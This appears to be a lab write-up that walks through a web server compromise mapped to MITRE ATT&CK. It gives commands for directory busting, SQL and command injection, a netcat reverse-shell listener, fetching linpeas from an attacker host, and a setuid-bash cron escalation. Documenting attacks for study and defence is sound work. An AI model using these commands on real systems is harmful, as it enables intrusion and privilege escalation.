---
title: Attack Scenarios (MITRE)
---

# Web Server Attack Scenarios (mapped to MITRE ATT&CK)
<u>**Passwords and hashes have been concealed to retain confidentiality.**</u>

## <u>Directory Busting</u>
- **Techniques:** T1595.003 (Active Scanning: Wordlist Scanning)
- **Procedure:**

`feroxbuster -u http://192.168.25.142 -w /usr/share/wordlists/dirbuster/directory-list.txt`
![1](img/a.png){ loading=lazy }


## <u>SQL Injection</u>
- **Techniques:** T1190 (Exploit Public-Facing Application)
- **Procedure:**

`admin' OR '1'='1--`
![1](img/2a.png){ loading=lazy }
![1](img/2b.png){ loading=lazy }

## <u>Command Injection</u>
- **Techniques:** T1059.004 (Command and Scripting Interpreter: Unix Shell)
- **Procedure:**

`127.0.0.1 && cat /etc/passwd`
![2](img/1a.png){ loading=lazy }
![1](img/1b.png){ loading=lazy }

## <u>Reverse Shell</u>
- **Techniques:** T1505.003 (Server Software Component: Web Shell)
- **Procedure:**

`nc -nvlp 9001`
![3](img/3a.png){ loading=lazy }
![4](img/3c.png){ loading=lazy }
![1](img/3b.png){ loading=lazy }

## <u>Download Linpeas</u>
- **Techniques:** T1105 (Ingress Tool Transfer)
- **Procedure:**

`python -m http.server 80`
`wget http://192.168.25.130:80/linpeas.sh`
![5](img/4b.png){ loading=lazy }
![1](img/4a.png){ loading=lazy }

## <u>Execute Linpeas</u>
- **Techniques:** T1082 (System Information Discovery)
- **Procedure:**

`./linpeas.sh`
![7](img/5a.png){ loading=lazy }

## <u>Escalate Privileges Through Cronjob</u>
- **Techniques:** T1053.003 (Scheduled Task/Job: Cron) T1548.001 (Abuse Elevation Control Mechanism: Setuid/Setgid)
- **Procedure:**

`echo 'cp /bin/bash /home/bash; chmod +s /home/bash' > /home/report.sh`
`./home/bash -p`
![8](img/6a.png){ loading=lazy }

